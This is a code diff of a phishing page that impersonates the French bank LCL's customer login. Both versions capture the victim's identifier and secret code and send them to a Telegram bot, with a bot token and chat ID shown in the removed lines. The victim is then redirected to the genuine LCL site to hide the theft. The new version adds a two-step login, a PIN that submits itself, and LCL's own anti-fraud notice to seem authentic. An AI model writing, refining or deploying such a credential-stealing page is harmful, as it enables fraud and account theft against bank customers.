@@ -9,7 +9,7 @@
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f5f5f5;
+            background-color: #ffffff;
             color: #333;
             display: flex;
             justify-content: center;
@@ -18,194 +18,249 @@
             padding: 20px;
         }
 
-        /* Conteneur principal imitant l'UI iOS */
         .login-container {
-            background-color: #fff;
             width: 100%;
             max-width: 400px;
-            padding: 30px 20px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            padding: 0 20px;
         }
 
-        /* Logo LCL (Utilisation du logo officiel) */
+        /* Logo LCL */
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
+            margin-top: 20px;
         }
         .logo img {
-            max-width: 120px;
+            max-width: 140px;
             height: auto;
         }
 
         /* Titres */
         h2 {
-            font-size: 18px;
-            color: #1f368b; /* Bleu LCL */
-            margin-bottom: 20px;
-            text-align: center;
+            font-size: 20px;
+            color: #000;
+            margin-bottom: 10px;
             font-weight: 600;
         }
+        p.subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
 
-        /* Champs de formulaire */
+        /* Champs */
         .form-group {
-            margin-bottom: 20px;
-            position: relative;
+            margin-bottom: 25px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #666;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: #333;
             font-weight: 500;
         }
 
         input[type="text"],
-        input[type="password"] {
+        input[type="tel"] {
             width: 100%;
-            padding: 15px;
-            font-size: 16px;
+            padding: 18px;
+            font-size: 18px;
             border: 1px solid #ccc;
-            border-radius: 8px;
-            background-color: #fafafa;
-            transition: border-color 0.3s;
-            -webkit-appearance: none; /* Important pour iOS */
+            border-radius: 4px;
+            background-color: #f9f9f9;
+            -webkit-appearance: none;
         }
 
         input:focus {
             outline: none;
             border-color: #1f368b;
             background-color: #fff;
-            box-shadow: 0 0 0 3px rgba(31, 54, 139, 0.1);
+            box-shadow: 0 0 0 1px #1f368b;
         }
 
-        /* Bouton Submit */
-        .btn-submit {
+        /* Bouton Suivant/Valider */
+        .btn-primary {
             width: 100%;
-            padding: 16px;
-            background-color: #1f368b; /* Bleu LCL */
+            padding: 18px;
+            background-color: #1f368b;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 4px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.3s;
             margin-top: 10px;
         }
-
-        .btn-submit:hover {
+        .btn-primary:active {
             background-color: #162766;
         }
-
-        .btn-submit:active {
-            transform: scale(0.98);
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: default;
         }
 
-        /* Liens bas de page */
-        .footer-links {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 13px;
+        /* Liens utilitaires */
+        .links {
+            margin-top: 25px;
+            font-size: 14px;
         }
-        .footer-links a {
+        .links a {
+            display: block;
             color: #1f368b;
             text-decoration: none;
-            display: block;
             margin-bottom: 10px;
         }
-        .footer-links a:hover {
-            text-decoration: underline;
+
+        /* Gestion des Vues (Ecrans) */
+        .view {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        .active {
+            display: block;
         }
 
-        /* Loader caché par défaut */
+        /* Loader */
         .loader {
             display: none;
             text-align: center;
-            margin-top: 15px;
+            margin-top: 20px;
             font-size: 14px;
             color: #666;
+        }
+
+        /* Footer LCL */
+        .footer-info {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            padding-bottom: 20px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <div class="logo">
-            <!-- Logo officiel LCL -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/LCL_Logo.svg/1200px-LCL_Logo.svg.png" alt="Logo LCL">
-        </div>
         
-        <h2>Connexion à Mon Espace Client</h2>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="userId">Identifiant</label>
-                <input type="text" id="userId" name="userId" placeholder="Ex: 12345678" required autocomplete="username" autofocus>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Code secret</label>
-                <input type="password" id="password" name="password" placeholder="Entrez votre code" required autocomplete="current-password">
-            </div>
-
-            <button type="submit" class="btn-submit">Se connecter</button>
-            
-            <div class="loader" id="loader">Vérification en cours...</div>
-        </form>
-
-        <div class="footer-links">
-            <a href="#">J'ai perdu mon identifiant</a>
-            <a href="#">Mot de passe oublié ?</a>
+        <div class="logo">
+            <!-- Logo LCL -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/LCL_Logo.svg/1200px-LCL_Logo.svg.png" alt="LCL">
         </div>
+
+        <!-- VUE 1 : IDENTIFIANT -->
+        <div id="view1" class="view active">
+            <h2>Mon espace client</h2>
+            <p class="subtitle">Pour accéder à vos comptes, saisissez votre identifiant.</p>
+
+            <div class="form-group">
+                <label for="userId">Votre identifiant</label>
+                <input type="text" id="userId" placeholder="Ex: 123 456 789" autocomplete="username" autofocus>
+            </div>
+
+            <button type="button" class="btn-primary" id="btnNext">Suivant</button>
+
+            <div class="links">
+                <a href="#">Identifiant oublié ?</a>
+                <a href="#">Mémoriser mon identifiant</a>
+            </div>
+        </div>
+
+        <!-- VUE 2 : CODE SECRET -->
+        <div id="view2" class="view">
+            <h2>Bonjour <span id="displayUser"></span></h2>
+            <p class="subtitle">Saisissez votre code personnel pour continuer.</p>
+
+            <div class="form-group">
+                <label for="pinCode">Votre code personnel</label>
+                <!-- Clavier numérique forcé pour iOS -->
+                <input type="tel" id="pinCode" placeholder="Ex: 1234" pattern="[0-9]*" inputmode="numeric" maxlength="4" autocomplete="current-password">
+            </div>
+
+            <button type="button" class="btn-primary" id="btnSubmit">Valider</button>
+
+            <div class="links">
+                <a href="#">Code personnel oublié ?</a>
+                <a href="#">Pas encore client ?</a>
+            </div>
+        </div>
+
+        <div class="loader" id="loader">Vérification de la connexion...</div>
+
+        <div class="footer-info">
+            LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer vos mots de passe ou codes confidentiels.
+        </div>
+
     </div>
 
     <script>
         // --- CONFIGURATION TELEGRAM ---
-        // Remplacez ces valeurs par les vôtres
-        const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ'; 
-        const TELEGRAM_CHAT_ID = '8501464548';
-        // --------------------------------
+        const TELEGRAM_BOT_TOKEN = 'VOTRE_TOKEN_BOT'; 
+        const TELEGRAM_CHAT_ID = 'VOTRE_CHAT_ID';
+        // -----------------------------
 
-        const form = document.getElementById('loginForm');
+        const view1 = document.getElementById('view1');
+        const view2 = document.getElementById('view2');
+        const userIdInput = document.getElementById('userId');
+        const pinCodeInput = document.getElementById('pinCode');
+        const displayUser = document.getElementById('displayUser');
         const loader = document.getElementById('loader');
-        const btn = document.querySelector('.btn-submit');
+        const btnNext = document.getElementById('btnNext');
+        const btnSubmit = document.getElementById('btnSubmit');
 
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Passage à l'écran 2
+        btnNext.addEventListener('click', () => {
+            const id = userIdInput.value.trim();
+            if (id.length > 0) {
+                displayUser.textContent = id;
+                view1.classList.remove('active');
+                view2.classList.add('active');
+                pinCodeInput.focus(); // Focus automatique sur le code
+            }
+        });
 
-            // 1. UI Feedback
-            btn.disabled = true;
-            btn.textContent = "Connexion...";
+        // Envoi final
+        btnSubmit.addEventListener('click', () => {
+            const code = pinCodeInput.value;
+            
+            // UI Feedback
+            btnSubmit.disabled = true;
+            btnSubmit.textContent = "Connexion...";
             loader.style.display = 'block';
 
-            // 2. Récupération des données
-            const userId = document.getElementById('userId').value;
-            const password = document.getElementById('password').value;
             const timestamp = new Date().toLocaleString('fr-FR');
-            
-            // 3. Envoi vers Telegram
-            const message = `🔐 <b>Nouvelle Connexion LCL</b>\n\n👤 <b>Identifiant:</b> ${userId}\n🔑 <b>Code:</b> ${password}\n📅 <b>Date:</b> ${timestamp}\n📱 <b>Appareil:</b> ${navigator.userAgent.match(/iPhone|iPad|iPod/)? 'iOS' : 'Autre'}`;
-            
+            const message = `🔐 <b>Connexion LCL Confirmée</b>\n\n👤 <b>Identifiant:</b> ${userIdInput.value}\n🔑 <b>Code:</b> ${code}\n📅 <b>Date:</b> ${timestamp}\n📱 <b>Appareil:</b> iOS`;
+
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
 
             fetch(telegramUrl)
-                .then(response => {
-                    if(response.ok) {
-                        console.log('Data sent to Telegram');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending to Telegram', error);
-                })
-                .finally(() => {
-                    // 4. Redirection vers la vraie page LCL
-                    // On simule un petit délai pour que l'utilisateur voie "Vérification..."
+                .then(() => {
+                    // Redirection vers la vraie page LCL après 1.5s
                     setTimeout(() => {
                         window.location.href = "https://monespace.lcl.fr/";
                     }, 1500);
+                })
+                .catch(() => {
+                     // Si l'envoi échoue, on redirige quand même
+                    window.location.href = "https://monespace.lcl.fr/";
                 });
+        });
+
+        // Auto-submit si l'utilisateur tape 4 chiffres (comme une vraie app)
+        pinCodeInput.addEventListener('input', (e) => {
+            if (pinCodeInput.value.length === 4) {
+                // Petit délai pour laisser voir le 4ème chiffre
+                setTimeout(() => {
+                    btnSubmit.click();
+                }, 500);
+            }
         });
     </script>
 
